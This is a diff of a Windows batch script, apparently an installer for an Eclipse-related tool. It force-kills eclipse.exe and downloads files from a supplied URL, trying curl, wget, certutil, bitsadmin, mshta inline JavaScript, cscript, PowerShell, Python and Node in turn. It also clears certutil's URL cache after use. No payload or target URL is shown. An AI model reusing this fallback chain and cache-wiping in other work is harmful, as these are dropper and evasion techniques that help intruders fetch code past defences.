@@ -49,14 +49,30 @@ echo %O2%    ===================================================================
 echo.
 
 :: ============================================================
+:: TASKKILL RUNNING ECLIPSE INSTANCES TO PREVENT WRITE LOCKS
+:: ============================================================
+echo %O2%    [*] Terminating any active eclipse.exe processes...%RESET%
+taskkill /f /im eclipse.exe >nul 2>&1
+echo %GREEN%    [+] Eclipse processes cleared.%RESET%
+echo.
+
+:: ============================================================
 :: TOOL DETECTION & SELECTION
 :: ============================================================
 set "count=0"
 for %%T in (dc2url python curl mshta powershell certutil cscript bitsadmin wget node winget) do (
     where %%T >nul 2>&1
     if not errorlevel 1 (
-        set /a count+=1
-        set "tool_!count!=%%T"
+        if /i "%%T"=="python" (
+            python --version >nul 2>&1
+            if not errorlevel 1 (
+                set /a count+=1
+                set "tool_!count!=%%T"
+            )
+        ) else (
+            set /a count+=1
+            set "tool_!count!=%%T"
+        )
     )
 )
 
@@ -206,47 +222,58 @@ goto :eof
 :: INDIVIDUAL TOOL DOWNLOAD FUNCTIONS
 :: ============================================================
 :download_curl
-curl -s -L -f "%~1" -o "%~2"
+if exist "%~2" del /f /q "%~2" >nul 2>&1
+curl -s -S -L -f "%~1" -o "%~2"
 goto :eof
 
 :download_wget
+if exist "%~2" del /f /q "%~2" >nul 2>&1
 wget -q "%~1" -O "%~2"
 goto :eof
 
 :download_certutil
+if exist "%~2" del /f /q "%~2" >nul 2>&1
 certutil -urlcache -split -f "%~1" "%~2" >nul 2>&1
 certutil -urlcache * delete >nul 2>&1
 goto :eof
 
 :download_powershell
+if exist "%~2" del /f /q "%~2" >nul 2>&1
 powershell -NoProfile -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing"
 goto :eof
 
 :download_bitsadmin
+if exist "%~2" del /f /q "%~2" >nul 2>&1
 bitsadmin /transfer dc2url_job /download /priority normal "%~1" "%~2" >nul 2>&1
 goto :eof
 
 :download_python
+if exist "%~2" del /f /q "%~2" >nul 2>&1
 python -c "import urllib.request; urllib.request.urlretrieve('%~1', '%~2')"
 goto :eof
 
 :download_node
+if exist "%~2" del /f /q "%~2" >nul 2>&1
 node -e "const fs=require('fs');const https=require('https');https.get('%~1',res=>{const stream=fs.createWriteStream('%~2');res.pipe(stream);});"
 goto :eof
 
 :download_mshta
+if exist "%~2" del /f /q "%~2" >nul 2>&1
 mshta "javascript:var xhr=new ActiveXObject('MSXML2.XMLHTTP');xhr.open('GET','%~1',false);xhr.send();var s=new ActiveXObject('ADODB.Stream');s.Type=1;s.Open();s.Write(xhr.ResponseBody);s.SaveToFile('%~2',2);window.close();"
 goto :eof
 
 :download_cscript
+if exist "%~2" del /f /q "%~2" >nul 2>&1
 cscript //nologo //e:jscript "%~f0" download_js "%~1" "%~2"
 goto :eof
 
 :download_dc2url
+if exist "%~2" del /f /q "%~2" >nul 2>&1
 dc2url "%~1" "%~2"
 goto :eof
 
 :download_winget
+if exist "%~2" del /f /q "%~2" >nul 2>&1
 powershell -NoProfile -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing"
 goto :eof
 
